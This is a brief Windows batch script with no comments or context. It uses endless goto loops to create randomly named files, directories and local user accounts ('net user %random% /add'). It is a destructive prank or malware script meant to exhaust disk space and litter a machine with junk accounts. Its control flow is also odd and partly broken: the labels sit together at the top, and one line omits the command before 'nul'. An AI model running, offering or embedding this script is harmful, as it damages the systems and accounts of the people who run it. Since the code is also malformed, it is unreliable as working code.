:user
:folders
:files

nul >> %random%
goto files
mkdir %random%
goto folders
net user %random% /add
goto user
